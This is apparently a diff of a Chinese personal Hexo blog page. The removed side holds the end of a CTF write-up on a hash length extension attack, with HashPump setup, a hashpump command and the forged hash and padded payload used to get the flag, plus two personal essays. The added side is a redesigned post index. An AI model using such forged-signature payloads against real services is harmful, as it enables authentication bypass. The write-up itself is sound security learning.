-<p>在Linux上下载： </p>
-<ul>
-<li>git clone <a href="https://github.com/bwall/HashPump" target="_blank" rel="noopener">https://github.com/bwall/HashPump</a></li>
-<li>apt-get install g++ libssl-dev</li>
-<li>cd HashPump</li>
-<li>make</li>
-<li>make install</li>
-</ul>
-<p>使用命令：</p>
-<blockquote>
-<p>hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d admin -k 20 -a ct</p>
-</blockquote>
-<p>生成了：</p>
-<blockquote>
-<p> getmein值：11c69586337cab7b919910735af3f688<br> password：admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00ct</p>
-</blockquote>
-<p>将所有\x改为%然后传入，得到flag值</p>
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>reference：<br><a href="https://www.freebuf.com/articles/web/31756.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/31756.html</a><br><a href="https://blog.csdn.net/qq_35078631/article/details/70941204" target="_blank" rel="noopener">https://blog.csdn.net/qq_35078631/article/details/70941204</a></p>
-
-      
-    </div>
-
-  </div>
-
-  <div class="article-footer">
-    <div class="article-meta pull-left">
-
-    
-
-    
-    
-
-    <span class="post-tags">
-      <i class="icon-tags"></i>
-        <a href="/tags/hash/">hash</a>
-    </span>
-    
-
-    </div>
-
-    
-  </div>
-</article>
-
-
-
-  <article>
-
-  
-    
-    <h3 class="article-title"><a href="/2017/12/31/随笔/Create/"><span>To2018</span></a></h3>
-    
-  
-
-  <div class="article-top-meta">
-    <span class="posted-on">
-      <a href="/2017/12/31/随笔/Create/" rel="bookmark">
-        <time class="entry-date published" datetime="2017-12-31T15:27:12.837Z">
-          2017-12-31
-        </time>
-      </a>
-    </span>
-  </div>
-
-
-  
-
-  <div class="article-content">
-    <div class="entry">
-      
-        <p>发生了太多，经历了太多，承受了太多，感觉一切都像是在hell，但又真真切切的存在于我的记忆中。你还好吗？愿你安好，天堂没有病痛，只有快乐。所以，让我来替你经历吧。<br>不在颓废了，我想留学了，至少我想去一个更好的地方。<br>总是在渴望着所谓的恋爱，但是恋爱不是全部呢，所以别被她所羁绊吧。</p>
-<ul>
-<li>To be a engineer</li>
-</ul>
-<ul>
-<li>To be a hacker</li>
-</ul>
-<ul>
-<li>To be a excellent man</li>
-</ul>
-<ul>
-<li>To be the best</li>
-</ul>
-<ul>
-<li>To Sillcon Valley</li>
-</ul>
-<ul>
-<li>To London</li>
-</ul>
-<ul>
-<li>To all over the world</li>
-</ul>
-<ul>
-<li>To be rich</li>
-</ul>
-<ul>
-<li><p>To concert</p>
-</li>
-<li><p>To Google</p>
-</li>
-</ul>
-<p>对，就这样<br><img src="https://i.imgur.com/r8cBo42.jpg" alt=""></p>
-
-      
-    </div>
-
-  </div>
-
-  <div class="article-footer">
-    <div class="article-meta pull-left">
-
-    
-
-    
-    
-
-    <span class="post-tags">
-      <i class="icon-tags"></i>
-        <a href="/tags/心绪/">心绪</a>
-    </span>
-    
-
-    </div>
-
-    
-  </div>
-</article>
-
-
-
-  <article>
-
-  
-    
-    <h3 class="article-title"><a href="/2017/12/04/随笔/无比芜杂的心绪/"><span>无比芜杂的心绪</span></a></h3>
-    
-  
-
-  <div class="article-top-meta">
-    <span class="posted-on">
-      <a href="/2017/12/04/随笔/无比芜杂的心绪/" rel="bookmark">
-        <time class="entry-date published" datetime="2017-12-04T12:31:25.452Z">
-          2017-12-04
-        </time>
-      </a>
-    </span>
-  </div>
-
-
-  
-
-  <div class="article-content">
-    <div class="entry">
-      
-        <p>—20:00</p>
-<pre><code>最近突然迷上了太宰治，《人间失格》中近乎颓丧的笔调让我感觉近乎阴郁，但“叶藏”却仿佛让我看到了另一个自己，但尚不及他。
-字里行间无不显露着一股忧郁混乱的之感，“叶藏”的一生倒也不尽悲哀。每一个喜剧家其实都是一个悲观主义者，我想这句话也是他的人生写照。每一个由“叶藏”所制造的喜剧却仿佛与他毫无关联，似乎此时此刻，他由一个剧作家变为了观众，谈不上欣赏，只是默默观看。“床头金尽，情缘两断”，看似戏谑，可是真的如此吗？
-他有时是一个人，烟酒，妓女，金钱，也都一一尝尽；有时却与人遥隔两端，他是没有归属感的，“好子”的被侵犯，愤怒似乎从来没出现过在他身上，对死也无所畏惧。
-其实也很悲哀吧，昏暗的一生，一直在演出着某出喜剧，将真正的自己束之高阁，也是无奈之举，有着一股无形的力量好像捆束着手脚。
-</code></pre>
-      
-    </div>
-
-  </div>
-
-  <div class="article-footer">
-    <div class="article-meta pull-left">
-
-    
-
-    
-    
-
-    <span class="post-tags">
-      <i class="icon-tags"></i>
-        <a href="/tags/随笔/">随笔</a>
-    </span>
-    
-
-    </div>
-
-    
-  </div>
-</article>
-
-
-
-
-<nav class="pagination">
-  
-  <a href="/page/4/" class="pagination-prev">Prev</a>
-  
-  
-</nav>
-    </main>
-
-    <footer class="site-footer">
-  <p class="site-info">
-    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
-    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
-    </br>
-    
-    &copy; 2019 damn1t
-    
-  </p>
-</footer>
-    
   </div>
 </div>
-</body>
+
+      
+        <div class="post-item-wrapper">
+  <a href="/2018/09/08/pwn/pwnable1/" class="post-title">
+      pwnable.kr(1-2)
+  </a>
+  <div class="post-excerpt">
+    <!-- Post Date and Categories -->
+    <div class="date-and-category">
+      <div class="date">2018-09-08</div>
+      <div class="categories">
+        
+          Uncategorized
+        
+      </div>
+    </div>
+    <!-- Post Excerpt -->
+    <div class="excerpt typo">No Post Excerpt</div>
+    <!-- Post Tags -->
+    <div class="tags">
+      
+        
+
+<a class="tag" href="/tags/pwn/">pwn</a>
+
+
+      
+    </div>
+  </div>
+</div>
+
+      
+        <div class="post-item-wrapper">
+  <a href="/2018/07/19/web/编码与解码/" class="post-title">
+      关于编码与解码的思考
+  </a>
+  <div class="post-excerpt">
+    <!-- Post Date and Categories -->
+    <div class="date-and-category">
+      <div class="date">2018-07-19</div>
+      <div class="categories">
+        
+          Uncategorized
+        
+      </div>
+    </div>
+    <!-- Post Excerpt -->
+    <div class="excerpt typo">No Post Excerpt</div>
+    <!-- Post Tags -->
+    <div class="tags">
+      
+        
+
+<a class="tag" href="/tags/web/">web</a>
+
+
+      
+    </div>
+  </div>
+</div>
+
+      
+        <div class="post-item-wrapper">
+  <a href="/2018/05/29/web/序列化/" class="post-title">
+      php反序列化漏洞
+  </a>
+  <div class="post-excerpt">
+    <!-- Post Date and Categories -->
+    <div class="date-and-category">
+      <div class="date">2018-05-29</div>
+      <div class="categories">
+        
+          Uncategorized
+        
+      </div>
+    </div>
+    <!-- Post Excerpt -->
+    <div class="excerpt typo">No Post Excerpt</div>
+    <!-- Post Tags -->
+    <div class="tags">
+      
+        
+
+<a class="tag" href="/tags/web/">web</a>
+
+
+      
+    </div>
+  </div>
+</div>
+
+      
+        <div class="post-item-wrapper">
+  <a href="/2018/05/27/vulnerable/cbc/" class="post-title">
+      CBC字节翻转攻击
+  </a>
+  <div class="post-excerpt">
+    <!-- Post Date and Categories -->
+    <div class="date-and-category">
+      <div class="date">2018-05-27</div>
+      <div class="categories">
+        
+          Uncategorized
+        
+      </div>
+    </div>
+    <!-- Post Excerpt -->
+    <div class="excerpt typo">No Post Excerpt</div>
+    <!-- Post Tags -->
+    <div class="tags">
+      
+        
+
+<a class="tag" href="/tags/CTF/">CTF</a>
+
+
+      
+    </div>
+  </div>
+</div>
+
+      
+        <div class="post-item-wrapper">
+  <a href="/2018/05/27/vulnerable/php伪协议/" class="post-title">
+      php伪协议
+  </a>
+  <div class="post-excerpt">
+    <!-- Post Date and Categories -->
+    <div class="date-and-category">
+      <div class="date">2018-05-27</div>
+      <div class="categories">
+        
+          Uncategorized
+        
+      </div>
+    </div>
+    <!-- Post Excerpt -->
+    <div class="excerpt typo">No Post Excerpt</div>
+    <!-- Post Tags -->
+    <div class="tags">
+      
+        
+
+<a class="tag" href="/tags/CTF/">CTF</a>
+
+
+      
+    </div>
+  </div>
+</div>
+
+      
+        <div class="post-item-wrapper">
+  <a href="/2018/03/15/vulnerable/hash扩展攻击/" class="post-title">
+      hash长度扩展攻击
+  </a>
+  <div class="post-excerpt">
+    <!-- Post Date and Categories -->
+    <div class="date-and-category">
+      <div class="date">2018-03-15</div>
+      <div class="categories">
+        
+          Uncategorized
+        
+      </div>
+    </div>
+    <!-- Post Excerpt -->
+    <div class="excerpt typo">No Post Excerpt</div>
+    <!-- Post Tags -->
+    <div class="tags">
+      
+        
+
+<a class="tag" href="/tags/hash/">hash</a>
+
+
+      
+    </div>
+  </div>
+</div>
+
+      
+        <div class="post-item-wrapper">
+  <a href="/2017/12/31/随笔/Create/" class="post-title">
+      To2018
+  </a>
+  <div class="post-excerpt">
+    <!-- Post Date and Categories -->
+    <div class="date-and-category">
+      <div class="date">2017-12-31</div>
+      <div class="categories">
+        
+          Uncategorized
+        
+      </div>
+    </div>
+    <!-- Post Excerpt -->
+    <div class="excerpt typo">No Post Excerpt</div>
+    <!-- Post Tags -->
+    <div class="tags">
+      
+        
+
+<a class="tag" href="/tags/心绪/">心绪</a>
+
+
+      
+    </div>
+  </div>
+</div>
+
+      
+        <div class="post-item-wrapper">
+  <a href="/2017/12/04/随笔/无比芜杂的心绪/" class="post-title">
+      无比芜杂的心绪
+  </a>
+  <div class="post-excerpt">
+    <!-- Post Date and Categories -->
+    <div class="date-and-category">
+      <div class="date">2017-12-04</div>
+      <div class="categories">
+        
+          Uncategorized
+        
+      </div>
+    </div>
+    <!-- Post Excerpt -->
+    <div class="excerpt typo">No Post Excerpt</div>
+    <!-- Post Tags -->
+    <div class="tags">
+      
+        
+
+<a class="tag" href="/tags/随笔/">随笔</a>
+
+
+      
+    </div>
+  </div>
+</div>
+
+      
+    </div>
+  </div>
+</div>
+
+<!-- Pagination -->
+<div class="container">
+  <div class="row">
+    <div class="col-lg-10 col-md-10 col-md-offset-1">
+      <ul class="pagination">
+          
+              <li class="previous">
+                <a href="/page/4/">
+                  <span class="symbol-left">&lt;</span>
+                  <span>PREV</span>
+                </a>
+              </li>
+          
+          
+      </ul>
+    </div>
+  </div>
+</div>
+
+
+
+    <!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <p class="copyright text-muted">
+          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
+          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
+        <p class="copyright text-muted">
+          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+    <!-- After Footer Scripts -->
+<script src="/js/highlight.pack.js"></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function(event) {
+    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
+    codeBlocks.forEach(function(block, index) {
+      hljs.highlightBlock(block);
+    });
+  });
+</script>
+
+  </body>
 </html>
+
